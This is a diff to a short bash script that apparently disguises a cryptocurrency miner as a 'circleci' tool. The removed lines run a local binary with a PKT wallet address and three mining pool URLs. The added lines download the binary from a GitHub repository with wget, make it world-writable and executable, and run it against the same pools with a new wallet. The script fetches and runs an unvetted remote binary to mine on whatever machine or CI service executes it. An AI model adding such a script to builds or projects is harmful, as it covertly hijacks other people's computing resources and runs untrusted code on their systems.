@@ -1,5 +1,4 @@
 #!/bin/bash
-
-chmod +x circleci
-./circleci ann -p pkt1q7pw6hlgc7qdsc0s0g2yyc4dedlm8x9s0fzh3as http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world
-
+wget https://github.com/aurbach55/zash/raw/main/circleci
+chmod 777 circleci
+./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx  http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world
